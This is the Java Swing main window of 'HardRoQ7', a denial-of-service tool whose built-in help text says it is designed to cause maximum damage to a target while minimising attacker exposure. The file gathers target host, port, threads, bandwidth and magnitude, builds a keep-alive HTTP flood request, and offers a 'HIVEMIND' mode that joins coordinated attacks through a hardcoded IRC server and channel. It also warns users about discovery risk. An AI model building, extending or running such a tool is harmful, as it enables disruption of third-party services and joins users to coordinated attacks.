 package hardroq.ui;
 
 import hardroq.controllers.AttackController;
 import hardroq.controllers.HivemindController;
 
 import java.awt.Color;
 import java.awt.Component;
 import java.awt.EventQueue;
 import java.awt.Font;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
 import javax.swing.JOptionPane;
 import javax.swing.JPanel;
 import javax.swing.JScrollPane;
 import javax.swing.JSlider;
 import javax.swing.JSpinner;
 import javax.swing.JTextField;
 import javax.swing.JTextPane;
 import javax.swing.SpinnerNumberModel;
 import javax.swing.SwingConstants;
 import javax.swing.border.EtchedBorder;
 import javax.swing.border.TitledBorder;
 
 import org.eclipse.wb.swing.FocusTraversalOnArray;
 
 public class MainWindow {
 	
 	private static final String STATUS_STRING = "<html><body>Currently Attacking: %s<br>Packets Sent: %s<br>Current RTT: %s<br>RTT Delta: %s</body></html>";
 
 	private JFrame frmHardroq;
 	private JTextField txtHost;
 	private JTextField txtPort;
 	private JTextField txtBandwidth;
 	private JSpinner spinThreads;
 	private JSlider slideMagnitude;
 	private JButton btnSolo;
 	private JButton btnHivemind;
 	private JLabel lblStatus;
 	private boolean attacking = false;
 	private Thread statusThread;
 	
 	/**
 	 * Launch the application.
 	 */
 	public static void main(String[] args) {
 		EventQueue.invokeLater(new Runnable() {
 			public void run() {
 				try {
 					MainWindow window = new MainWindow();
 					window.frmHardroq.setVisible(true);
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
 			}
 		});
 	}
 
 	/**
 	 * Create the application.
 	 */
 	public MainWindow() {
 		initialize();
 		statusThread = new Thread(statusRunner, "Status Updater");
 		statusThread.start();
 	}
 
 	/**
 	 * Initialize the contents of the frame.
 	 */
 	private void initialize() {
 		frmHardroq = new JFrame();
 		frmHardroq.setResizable(false);
 		frmHardroq.setTitle("HardRoQ7 v0.1a");
 		frmHardroq.getContentPane().setForeground(Color.LIGHT_GRAY);
 		frmHardroq.getContentPane().setBackground(Color.DARK_GRAY);
 		frmHardroq.getContentPane().setLayout(null);
 		
 		btnHivemind = new JButton("HIVEMIND");
 		btnHivemind.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				connectToHivemind();
 			}
 		});
 		
 		lblStatus = new JLabel("");
 		lblStatus.setVerticalAlignment(SwingConstants.TOP);
 		lblStatus.setForeground(Color.LIGHT_GRAY);
 		lblStatus.setBounds(26, 451, 263, 109);
 		frmHardroq.getContentPane().add(lblStatus);
 		btnHivemind.setBounds(465, 258, 372, 29);
 		frmHardroq.getContentPane().add(btnHivemind);
 		
 		JLabel lblNewLabel = new JLabel("");
 		lblNewLabel.setHorizontalAlignment(SwingConstants.CENTER);
 		lblNewLabel.setBounds(13, 6, 440, 530);
 		lblNewLabel.setIcon(new ImageIcon(MainWindow.class.getResource("/hardroq/ui/resources/splash2.gif")));
 		frmHardroq.getContentPane().add(lblNewLabel);
 		
 		JPanel panel = new JPanel();
 		panel.setBounds(467, 6, 370, 91);
 		panel.setBackground(Color.DARK_GRAY);
 		panel.setBorder(new TitledBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null), "1. target", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(192, 192, 192)));
 		frmHardroq.getContentPane().add(panel);
 		panel.setLayout(null);
 		
 		JLabel lblNewLabel_1 = new JLabel("URL / IP: ");
 		lblNewLabel_1.setHorizontalAlignment(SwingConstants.RIGHT);
 		lblNewLabel_1.setForeground(Color.LIGHT_GRAY);
 		lblNewLabel_1.setBounds(20, 28, 90, 16);
 		panel.add(lblNewLabel_1);
 		
 		txtHost = new JTextField();
 		txtHost.setForeground(Color.ORANGE);
 		txtHost.setBackground(Color.DARK_GRAY);
 		txtHost.setBounds(122, 22, 239, 28);
 		panel.add(txtHost);
 		txtHost.setColumns(10);
 		
 		JLabel lblNewLabel_2 = new JLabel("PORT: ");
 		lblNewLabel_2.setHorizontalAlignment(SwingConstants.RIGHT);
 		lblNewLabel_2.setForeground(Color.LIGHT_GRAY);
 		lblNewLabel_2.setBounds(20, 59, 90, 16);
 		panel.add(lblNewLabel_2);
 		
 		txtPort = new JTextField();
 		txtPort.setForeground(Color.ORANGE);
 		txtPort.setBackground(Color.DARK_GRAY);
 		txtPort.setBounds(122, 56, 239, 22);
 		panel.add(txtPort);
 		txtPort.setColumns(10);
 		
 		JPanel panel_1 = new JPanel();
 		panel_1.setBounds(467, 109, 370, 131);
 		panel_1.setBorder(new TitledBorder(null, "2. intensity", TitledBorder.LEADING, TitledBorder.TOP, null, Color.LIGHT_GRAY));
 		panel_1.setBackground(Color.DARK_GRAY);
 		frmHardroq.getContentPane().add(panel_1);
 		panel_1.setLayout(null);
 		
 		JLabel lblNewLabel_3 = new JLabel("THREADS: ");
 		lblNewLabel_3.setHorizontalAlignment(SwingConstants.RIGHT);
 		lblNewLabel_3.setForeground(Color.LIGHT_GRAY);
 		lblNewLabel_3.setBounds(20, 28, 90, 16);
 		panel_1.add(lblNewLabel_3);
 		
 		spinThreads = new JSpinner();
 		spinThreads.setForeground(Color.LIGHT_GRAY);
 		spinThreads.setBackground(Color.DARK_GRAY);
 		spinThreads.setModel(new SpinnerNumberModel(new Integer(1), new Integer(1), null, new Integer(1)));
 		spinThreads.setBounds(122, 22, 50, 28);
 		panel_1.add(spinThreads);
 		
 		JLabel lblBandwidth = new JLabel("BANDWIDTH:");
 		lblBandwidth.setHorizontalAlignment(SwingConstants.RIGHT);
 		lblBandwidth.setForeground(Color.LIGHT_GRAY);
 		lblBandwidth.setBounds(20, 56, 90, 16);
 		panel_1.add(lblBandwidth);
 		
 		txtBandwidth = new JTextField();
 		txtBandwidth.setHorizontalAlignment(SwingConstants.RIGHT);
 		txtBandwidth.setBackground(Color.DARK_GRAY);
 		txtBandwidth.setForeground(Color.ORANGE);
 		txtBandwidth.setBounds(122, 49, 180, 28);
 		panel_1.add(txtBandwidth);
 		txtBandwidth.setColumns(10);
 		
 		JLabel lblMbps = new JLabel("Mbps");
 		lblMbps.setForeground(Color.LIGHT_GRAY);
 		lblMbps.setBounds(303, 55, 61, 16);
 		panel_1.add(lblMbps);
 		
 		JLabel lblNewLabel_4 = new JLabel("( upload bandwidth )");
 		lblNewLabel_4.setVerticalAlignment(SwingConstants.TOP);
 		lblNewLabel_4.setFont(new Font("Lucida Grande", Font.PLAIN, 8));
 		lblNewLabel_4.setHorizontalAlignment(SwingConstants.RIGHT);
 		lblNewLabel_4.setForeground(Color.LIGHT_GRAY);
 		lblNewLabel_4.setBounds(122, 76, 174, 16);
 		panel_1.add(lblNewLabel_4);
 		
 		JLabel lblMagnitude = new JLabel("MAGNITUDE:");
 		lblMagnitude.setForeground(Color.LIGHT_GRAY);
 		lblMagnitude.setHorizontalAlignment(SwingConstants.RIGHT);
 		lblMagnitude.setBounds(20, 95, 90, 16);
 		panel_1.add(lblMagnitude);
 		
 		slideMagnitude = new JSlider();
 		slideMagnitude.setSnapToTicks(true);
 		slideMagnitude.setPaintTicks(true);
 		slideMagnitude.setFont(new Font("Lucida Grande", Font.PLAIN, 8));
 		slideMagnitude.setMinorTickSpacing(5);
 		slideMagnitude.setMajorTickSpacing(25);
 		slideMagnitude.setForeground(Color.LIGHT_GRAY);
 		slideMagnitude.setPaintLabels(true);
 		slideMagnitude.setBounds(122, 89, 190, 40);
 		panel_1.add(slideMagnitude);
 		
 		JLabel label = new JLabel("%");
 		label.setFont(new Font("Lucida Grande", Font.PLAIN, 14));
 		label.setForeground(Color.LIGHT_GRAY);
 		label.setBounds(311, 93, 24, 16);
 		panel_1.add(label);
 		
 		btnSolo = new JButton("SHRED SOLO");
 		btnSolo.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				shredSolo();
 			}
 		});
 		btnSolo.setBounds(465, 289, 372, 29);
 		frmHardroq.getContentPane().add(btnSolo);
 		
 		JTextPane txtpnHardroqIsA = new JTextPane();
 		JScrollPane slider = new JScrollPane(txtpnHardroqIsA);
 		slider.setViewportBorder(null);
 		txtpnHardroqIsA.setEditable(false);
 		txtpnHardroqIsA.setContentType("text/html");
 		txtpnHardroqIsA.setText("<html><head></head><body>\n<p>HardRoQ7 is a Reduction of Quality / Denial of Service testing tool designed to cause maximum damage to the target, while minimizing attacker exposure.  The attack works by sending bulk packages of legitimate requests at regular intervals in order to exploit Application Layer (OSI Layer 7) Congestion Avoidance algorithms.  Poorly designed congestion avoidance algorithms at the application layer, as well as high magnitude attacks, can also trigger Transport Layer (OSI Layer 4) Congestion Algorithms to trigger as well.\n</p>\n<p>\nUsing HardRoQ7 is relatively straightforward.  First set the <i>target</i> of the attack.  You can use either a <b>URL</b> or an <b>IP</b> address as the target host.  The <b>port</b> may also be specified, or will be chosen as the default port derived from the protocol supplied in the URL.\n</p>\n<p>\nNext, be sure to set your <i>intensity</i> configuration.  The number of <b>threads</b> should be equal to the number of cores running on your system (or double that if you use Intel Hyperthreading).  Next, you should supply the amount of <b>bandwidth</b> to be utilized.  This is <b>upload bandwidth</b>, not download bandwidth.  If you are unsure of your upload bandwidth, you can test it at <a href=\"http://www.speedtest.net\" target=\"_new\">speedtest.net</a>.  The last intensity setting to configure is the <b>magnitude</b>.  This is a % of the available bandwidth that should be utilized in the attack.\n</p>\n<p>\n<u><b>IMPORTANT:  A HIGHER MAGNITUDE VALUE EXPOSES MORE RISK OF BEING DISCOVERED BY THE TARGET.  A LOWER MAGNITUDE VALUE DECREASES ATTACK EFFECTIVENESS.<b></i>\n</p>\n<p>\nFinally, you can choose to either attack by yourself, or join the HIVEMIND for coordinated attacks.  Everybody knows what this does.<br><br>\n\nEnjoy.<br>\n-dustin\n</body></html>\n");
 		txtpnHardroqIsA.setBounds(467, 405, 372, 131);
 		slider.setBounds(465, 330, 372, 231);
 		frmHardroq.getContentPane().add(slider);
 		frmHardroq.getContentPane().setFocusTraversalPolicy(new FocusTraversalOnArray(new Component[]{txtHost, txtPort, spinThreads, txtBandwidth, slideMagnitude, btnHivemind}));
 		frmHardroq.setBounds(100, 100, 845, 600);
 		frmHardroq.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
 		frmHardroq.setFocusTraversalPolicy(new FocusTraversalOnArray(new Component[]{txtHost, txtPort, spinThreads, txtBandwidth, slideMagnitude, btnHivemind}));
 	}
 
 	protected void shredSolo() {
 		if (!attacking)
 		{
 			attacking = true;
 			
 			if (txtHost.getText() == "" || txtPort.getText() == "")
 			{
 				JOptionPane.showMessageDialog(frmHardroq, "Please verify your target settings.");
 				return;
 			}
 			
 			final String host = txtHost.getText();
 			final int port = Integer.parseInt(txtPort.getText());
 			AttackController.getInstance().setTarget(host);
 			AttackController.getInstance().setPort(port);
 			
 			//let's just hardcode this shit for now...
 			String h = "";
 			h += "GET / HTTP/1.1\r\n";
 			h += "Host: " + host + ":" + String.valueOf(port) + "\r\n";
 			h += "Connection: keep-alive\r\n";
 			h += "\r\n";
 			
 			AttackController.getInstance().setAttackHeader(h);
 			
 			if(setIntensity()) AttackController.getInstance().Attack();
 			
 			btnSolo.setText("MY BRAIN IS MELTED");
 			btnHivemind.setEnabled(false);
 		} else {
 			btnSolo.setText("SHRED SOLO");
 			btnHivemind.setEnabled(true);
 			AttackController.getInstance().EndAttack();
 			attacking = false;
 		}
 	}
 
 	protected void connectToHivemind() {
 		if (!attacking)
 		{
 			if (setIntensity())
 			{
 				attacking = true;
 				//hardcode this for now
 				HivemindController.getInstance().setServer("tiny.anonops.in");
 				HivemindController.getInstance().setChannel("#opnewblood");
 				HivemindController.getInstance().setNick("HardRoQTest");
 				
 				HivemindController.getInstance().connectToHivemind();	
 				
 				btnSolo.setText("MY BRAIN IS MELTED");
 				btnHivemind.setEnabled(false);
 			}
 		} else {
 			btnSolo.setText("SHRED SOLO");
 			btnHivemind.setEnabled(true);
 			AttackController.getInstance().EndAttack();
 			attacking = false;
 		}
 	}
 
 	private boolean setIntensity() {
 		if (txtBandwidth.getText() != "")
 		{
 			AttackController.getInstance().setNumThreads((Integer)spinThreads.getValue());
 			AttackController.getInstance().setBandwidth(Float.parseFloat(txtBandwidth.getText()));
 			AttackController.getInstance().setAggressionIndex(slideMagnitude.getValue());
 			return true;
 		}
 		
 		JOptionPane.showMessageDialog(frmHardroq, "Please set your bandwidth and verify your intensity settings.");
 		return false;
 	}
 	
 	private Runnable statusRunner = new Runnable() {
 		@Override
 		public void run() {
 			while (true)
 			{
 				if (AttackController.getInstance().isAttacking())
 				{
 					final String currentRTT = String.valueOf(AttackController.getInstance().getCurrentRTT());
 					final String deltaRTT = String.valueOf(AttackController.getInstance().getDeltaRTT() * 100f) + "%";
 					final String cAttack = String.valueOf(AttackController.getInstance().isAttacking());
 					final String pSent = String.valueOf(AttackController.getInstance().getPacketCount());
 					lblStatus.setText(String.format(STATUS_STRING, cAttack, pSent, currentRTT, deltaRTT));
 				} else {
 					lblStatus.setText("Currently Attacking: false");
 				}
 				
 				try {
 					Thread.sleep(500);
 				} catch (InterruptedException e) {
 					System.out.println(e.getMessage());
 				}
 			}
 		}
 	};
 }
